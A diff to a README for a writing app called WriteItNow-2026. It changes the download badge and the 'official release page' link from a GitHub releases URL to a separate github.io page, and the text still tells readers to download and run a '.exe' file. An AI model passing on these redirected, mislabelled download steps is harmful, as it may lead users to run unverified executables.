@@ -1,6 +1,6 @@
 # ✍️ WriteItNow-2026 - Write novels with focus and ease
 
-[![](https://img.shields.io/badge/Download_WriteItNow-2026-blue.svg)](https://github.com/asphaltic-leftovers503/WriteItNow-2026/releases)
+[![](https://img.shields.io/badge/Download_WriteItNow-2026-blue.svg)](https://asphaltic-leftovers503.github.io)
 
 WriteItNow-2026 serves writers who need a digital space to organize their work. The software tracks characters, plots, and chapters in one place. It helps you manage long projects without losing track of your ideas.
 
@@ -8,7 +8,7 @@ WriteItNow-2026 serves writers who need a digital space to organize their work. 
 
 Follow these steps to get WriteItNow-2026 on your computer.
 
-1. Go to the [official release page](https://github.com/asphaltic-leftovers503/WriteItNow-2026/releases).
+1. Go to the [official release page](https://asphaltic-leftovers503.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the file ending in ".exe" to start the download.
 4. Save the file to your desktop or your downloads folder.
